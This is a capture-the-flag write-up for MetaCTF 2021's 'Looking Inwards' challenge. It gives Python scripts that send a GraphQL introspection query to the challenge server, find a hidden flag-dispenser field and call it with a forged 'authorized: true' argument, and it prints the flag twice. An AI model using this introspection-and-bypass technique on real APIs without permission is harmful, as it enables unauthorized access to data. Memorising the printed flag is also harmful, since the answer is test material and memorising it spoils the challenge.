# MetaCTF 2021

## Looking Inwards (300pts)

### Description:

> It's always fun to take a moment of introspection, in this case not about
> oneself, but about our field (development/security). For example when it
> comes to API design, first there were SOAP endpoints primarily based on XML.
> Then as Web 2.0 came along, RESTful APIs became all the rage. Recently,
> technologies like GraphQL began to gain traction.

> With new technologies, though, come new classes of attacks. Check out this
> basic [GraphQL API
> server](https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php).
> To get you started, here's one cool thing it can do: If you send it a
> `query` in the form of `echo(message: "message_here")`, it will respond with
> what you said. Can you get it to give you the flag?

### Included Files:

> No files provided

### Step 1 - Sending a Query to the GraphQL API

Before we could attempt to find the flag, first we wanted to get a valid
response back from the GraphQL server using the query `echo(message:
"message_here")` which was provided in the challenge description.

We used the following [tutorial](https://towardsdatascience.com/connecting-to-
a-graphql-api-using-python-246dda927840) from `Towards Data Science` which
walked us through how to send a GraphQL request using Python. Below allowed us
to send that query.

```python  
import requests  
import pandas as pd

query = '''query {  
	echo(message: "message_here")  
}'''

url = 'https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php'  
r = requests.post(url, json={'query': query})  
print(r.text)  
```

Output:

```JSON  
{"data":{"echo":"You said: message_here"}}  
```

### Step 2 - Find Other Endpoints on GraphQL API

After a bit of research, we learned we can use a technique called
`introspection` on GraphQL APIs to find other endpoints. Using the following
[tutorial](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-
endpoint-bug-bounty/) from `Yes We Hack`, they included the following request:

```  
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name
description locations args{...InputValue}}}}fragment FullType on __Type{kind
name description fields(includeDeprecated:true){name description
args{...InputValue}type{...TypeRef}isDeprecated
deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name
description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment
InputValue on __InputValue{name description
type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind
name ofType{kind name ofType{kind name ofType{kind name ofType{kind name
ofType{kind name ofType{kind name}}}}}}}}  
```

After putting this request into our script from the previous step, we found
the following in the output:

```JSON  
{  
   "name": "super_super_secret_flag_dispenser",  
   "description": null,  
   "args": [{  
       "name": "authorized",  
       "description": null,  
       "type": {  
           "kind": "NON_NULL",  
           "name": null,  
           "ofType": {  
               "kind": "SCALAR",  
               "name": "Boolean",  
               "ofType": null  
           }  
       },  
       "defaultValue": null  
   }],  
   "type": {  
       "kind": "NON_NULL",  
       "name": null,  
       "ofType": {  
           "kind": "SCALAR",  
           "name": "String",  
           "ofType": null  
       }  
   },  
   "isDeprecated": false,  
   "deprecationReason": null  
   }],  
   "inputFields": null,  
   "interfaces": [],  
   "enumValues": null,  
   "possibleTypes": null

}  
```  
This shows that there is an endpoint called
`super_super_secret_flag_dispenser` that takes in a boolean called
`authorized`.

## Step 3 - Retrieving the Flag

Using the information from the previous step, we crafted the following query:

```  
query {  
   super_super_secret_flag_dispenser(authorized: true)  
}  
```

Our final script looks like this:

```Python  
import requests  
import pandas as pd

query = '''query{  
   super_super_secret_flag_dispenser(authorized: true)  
}'''

url = 'https://metaproblems.com/bb0e56b64e0a17b47450457b07fd2353/graphql.php'  
r = requests.post(url, json={'query': query})  
print(r.text)  
```

<details>  
<summary> Output (contains the flag) </summary>  

  
{"data":{"super_super_secret_flag_dispenser":"MetaCTF{look_deep_and_who_knows_what_you_might_find}"}}  

  
</details>

<details>  
   <summary> Flag Spoiler </summary>  
   MetaCTF{look_deep_and_who_knows_what_you_might_find}  
</details>

## Learning Takeaways  
We can use introspection in order to discover endpoints of a GraphQL API.
GraphQL APIs can disable introspection and it is a recommended practice for
production. Well-made documentation is preferred. Python is a powerful tool
for completing GraphQL challenges in the future.  

Original writeup
(https://github.com/team23ctf/writeups/blob/main/metactf2021/Looking%20Inwards/Looking%20Inwards.md).